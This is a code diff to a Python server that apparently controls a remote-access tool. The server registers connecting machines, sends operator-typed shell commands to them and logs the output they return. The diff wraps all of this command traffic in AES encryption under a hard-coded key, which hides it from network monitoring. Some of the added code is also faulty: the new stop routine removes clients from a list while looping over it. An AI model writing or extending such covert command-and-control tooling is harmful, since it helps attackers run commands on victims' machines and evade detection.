@@ -10,12 +10,15 @@ from tabulate import tabulate
 from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import ThreadedFTPServer
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad,unpad
 
 Host = "192.168.30.52"
 Port = 6565
 client_list=[]
 address_list = []
 line_buffer = ""
+aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
 
 class ftpserver:
@@ -144,7 +147,17 @@ def stop_data_read():
     global data_collection
     data_collection = False
 
+def encrypt_data(data):
+    cipher = AES.new(aes_key, AES.MODE_CBC)
+    ciphertext = cipher.encrypt(pad(data, AES.block_size))
+    return cipher.iv + ciphertext
 
+def decrypt_data(encrypted_data):
+    iv = encrypted_data[:AES.block_size]
+    ciphertext = encrypted_data[AES.block_size:]
+    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    return decrypted_data
 
 
 
@@ -162,7 +175,7 @@ def client_connected(server):
             sam_client, sam_address = server.accept()
             client_list.append(sam_client)
             address_list.append(sam_address)
-            check_hostname(sam_client.recv(1024).decode("utf-8"),sam_client)
+            check_hostname(decrypt_data(sam_client.recv(1024)).decode("utf-8"),sam_client)
     except:
         print(colour.info("[*] Socket sessions closed."))
         history_saver("[*] Socket sessions closed.")
@@ -173,11 +186,13 @@ def check_hostname(HostName,client):
     for each in data['client_list']:
         if each['HostName'] == HostName:
             userAdd = False
-            client.send(b"hello")
+            enc = encrypt_data(b"hello")
+            client.send(enc)
     if userAdd :
-        client.send(b"whoareyou")
+        enc = encrypt_data(b"whoareyou")
+        client.send(enc)
         IP = client.getpeername()[0]
-        UserName = client.recv(1024).decode("utf-8")
+        UserName = decrypt_data(client.recv(1024)).decode("utf-8")
         new_client = {
             "IP" : IP,
             "HostName" : HostName,
@@ -247,9 +262,10 @@ def connect(NickName):
             print(colour.info(f"[*] Connected to {NickName} !!"))
             history_saver(f"[*] Connected to {NickName} !!")
             command = ''
-            client.send(b'connect')
+            enc = encrypt_data(b"connect")
+            client.send(enc)
             while command != "close":
-                pwd = client.recv(40960).decode('utf-8')
+                pwd = decrypt_data(client.recv(40960)).decode('utf-8')
                 while True:
                     command = input(f"{colour.CC} {colour.NickName('<'+NickName+'>')} {colour.Path('('+pwd+')')} {colour.arrow} ");print("\033[0m", end='')
                     log_saver(HostName,command)
@@ -257,8 +273,9 @@ def connect(NickName):
                         os.system('cls' if os.name == 'nt' else 'clear')
                     elif command != "":
                         break
-                client.send(command.encode('utf-8'))
-                output = f"{client.recv(4096000).decode('utf-8')}"
+                enc = encrypt_data(command.encode('utf-8'))
+                client.send(enc)
+                output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
                 print(output,end="")
                 log_saver(HostName,output)
 
@@ -274,7 +291,8 @@ def nick(HostName,NickName):
 
 def close():
     for f in client_list:
-        f.send(b"exit")
+        enc = encrypt_data(b"exit")
+        f.send(enc)
     server.close()
     global data_collection
     data_collection = False 
@@ -309,9 +327,17 @@ def stop(NickName):
             history_saver(f"[*] {NickName}'s Status Changed as: False ")
             print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
             client["Status"] = "False"
+            IP = client["IP"]
             with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
-                
+    for client in client_list : 
+        raddr = client.getpeername()[0] if client else None
+        if raddr == IP :
+            print(colour.info(f"[*] Connection closed: {NickName} !!"))
+            history_saver(f"[*] Connection closed: {NickName} !!")
+            enc = encrypt_data(b"close")
+            client.send(enc)
+        client_list.remove(client)            
 
 
 
